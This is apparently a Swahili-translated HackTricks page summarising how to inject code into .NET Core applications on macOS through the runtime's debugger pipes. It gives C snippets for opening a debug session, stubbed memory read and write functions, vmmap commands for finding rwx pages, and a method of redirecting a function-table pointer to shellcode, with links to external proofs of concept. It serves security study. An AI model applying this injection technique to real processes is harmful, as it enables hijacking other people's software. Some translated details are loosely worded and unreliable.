# Uingizaji wa Programu za .Net kwenye macOS

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi mtaalamu na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

**Hii ni muhtasari wa chapisho [https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/](https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/). Angalia kwa maelezo zaidi!**

## Udukuzi wa .NET Core <a href="#net-core-debugging" id="net-core-debugging"></a>

### **Kuanzisha Kikao cha Udukuzi** <a href="#net-core-debugging" id="net-core-debugging"></a>

Usimamizi wa mawasiliano kati ya kudukuzi na programu inayodukuliwa katika .NET unadhibitiwa na [**dbgtransportsession.cpp**](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/shared/dbgtransportsession.cpp). Sehemu hii inaweka mabomba mawili yaliyopewa jina kwa kila mchakato wa .NET kama ilivyoonekana katika [dbgtransportsession.cpp#L127](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/shared/dbgtransportsession.cpp#L127), ambayo huanzishwa kupitia [twowaypipe.cpp#L27](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/debug-pal/unix/twowaypipe.cpp#L27). Mabomba haya yanamaliziwa na **`-in`** na **`-out`**.

Kwa kutembelea **`$TMPDIR`** ya mtumiaji, mtu anaweza kupata mabomba ya udukuzi yanayopatikana kwa ajili ya programu za .Net.

[**DbgTransportSession::TransportWorker**](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/shared/dbgtransportsession.cpp#L1259) inahusika na usimamizi wa mawasiliano kutoka kwa kudukuzi. Ili kuanzisha kikao kipya cha udukuzi, kudukuzi lazima atume ujumbe kupitia mabomba ya `out` ukiwa na muundo wa `MessageHeader` struct, ulioelezewa kwa undani katika msimbo wa chanzo wa .NET:
```c
struct MessageHeader {
MessageType   m_eType;        // Message type
DWORD         m_cbDataBlock;  // Size of following data block (can be zero)
DWORD         m_dwId;         // Message ID from sender
DWORD         m_dwReplyId;    // Reply-to Message ID
DWORD         m_dwLastSeenId; // Last seen Message ID by sender
DWORD         m_dwReserved;   // Reserved for future (initialize to zero)
union {
struct {
DWORD         m_dwMajorVersion;   // Requested/accepted protocol version
DWORD         m_dwMinorVersion;
} VersionInfo;
...
} TypeSpecificData;
BYTE          m_sMustBeZero[8];
}
```
Kuomba kikao kipya, muundo huu unajazwa kama ifuatavyo, ukiweka aina ya ujumbe kuwa `MT_SessionRequest` na toleo la itifaki kuwa toleo la sasa:
```c
static const DWORD kCurrentMajorVersion = 2;
static const DWORD kCurrentMinorVersion = 0;

// Configure the message type and version
sSendHeader.m_eType = MT_SessionRequest;
sSendHeader.TypeSpecificData.VersionInfo.m_dwMajorVersion = kCurrentMajorVersion;
sSendHeader.TypeSpecificData.VersionInfo.m_dwMinorVersion = kCurrentMinorVersion;
sSendHeader.m_cbDataBlock = sizeof(SessionRequestData);
```
Kichwa hiki kisha kinatumwa kwa lengo kwa kutumia `write` syscall, ikifuatiwa na `sessionRequestData` struct inayojumuisha GUID kwa kikao:
```c
write(wr, &sSendHeader, sizeof(MessageHeader));
memset(&sDataBlock.m_sSessionID, 9, sizeof(SessionRequestData));
write(wr, &sDataBlock, sizeof(SessionRequestData));
```
Operesheni ya kusoma kwenye bomba la `out` inathibitisha mafanikio au kushindwa kwa kuanzisha kikao cha kurekebisha makosa:
```c
read(rd, &sReceiveHeader, sizeof(MessageHeader));
```
## Kusoma Kumbukumbu
Marudio ya kubugia yameanzishwa, kumbukumbu inaweza kusomwa kwa kutumia aina ya ujumbe [`MT_ReadMemory`](https://github.com/dotnet/runtime/blob/f3a45a91441cf938765bafc795cbf4885cad8800/src/coreclr/src/debug/shared/dbgtransportsession.cpp#L1896). Kazi ya kusoma kumbukumbu imefafanuliwa, ikitekeleza hatua zinazohitajika kutuma ombi la kusoma na kupata jibu.
```c
bool readMemory(void *addr, int len, unsigned char **output) {
// Allocation and initialization
...
// Write header and read response
...
// Read the memory from the debuggee
...
return true;
}
```
Uthibitisho kamili wa dhana (POC) inapatikana [hapa](https://gist.github.com/xpn/95eefc14918998853f6e0ab48d9f7b0b).

## Kuandika Kumbukumbu

Vivyo hivyo, kumbukumbu inaweza kuandikwa kwa kutumia kazi ya `writeMemory`. Mchakato unahusisha kuweka aina ya ujumbe kuwa `MT_WriteMemory`, kisha kutoa anwani na urefu wa data, na hatimaye kutuma data:
```c
bool writeMemory(void *addr, int len, unsigned char *input) {
// Increment IDs, set message type, and specify memory location
...
// Write header and data, then read the response
...
// Confirm memory write was successful
...
return true;
}
```
POC inapatikana [hapa](https://gist.github.com/xpn/7c3040a7398808747e158a25745380a5).

## .NET Core Utekelezaji wa Kanuni <a href="#net-core-code-execution" id="net-core-code-execution"></a>

Ili kutekeleza kanuni, mtu anahitaji kutambua eneo la kumbukumbu lenye ruhusa za rwx, ambalo linaweza kufanywa kwa kutumia vmmap -pages:
```bash
vmmap -pages [pid]
vmmap -pages 35829 | grep "rwx/rwx"
```
Kupata mahali pa kubadilisha kidole cha kazi ni muhimu, na katika .NET Core, hii inaweza kufanywa kwa kulenga **Dynamic Function Table (DFT)**. Jedwali hili, lililoelezwa katika [`jithelpers.h`](https://github.com/dotnet/runtime/blob/6072e4d3a7a2a1493f514cdf4be75a3d56580e84/src/coreclr/src/inc/jithelpers.h), hutumiwa na runtime kwa kazi za msaada wa kompilisheni ya JIT.

Kwa mifumo ya x64, unaweza kutumia utafutaji wa saini kupata marejeleo kwa ishara `_hlpDynamicFuncTable` katika `libcorclr.dll`.

Kazi ya kudebugi ya `MT_GetDCB` hutoa habari muhimu, ikiwa ni pamoja na anwani ya kazi ya msaada, `m_helperRemoteStartAddr`, inayoonyesha mahali pa `libcorclr.dll` katika kumbukumbu ya mchakato. Anwani hii kisha hutumiwa kuanza utafutaji wa DFT na kubadilisha kidole cha kazi na anwani ya shellcode.

Msimbo kamili wa POC kwa kuingiza katika PowerShell unapatikana [hapa](https://gist.github.com/xpn/b427998c8b3924ab1d63c89d273734b6).

## Marejeo

* [https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/](https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/)

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa katika HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
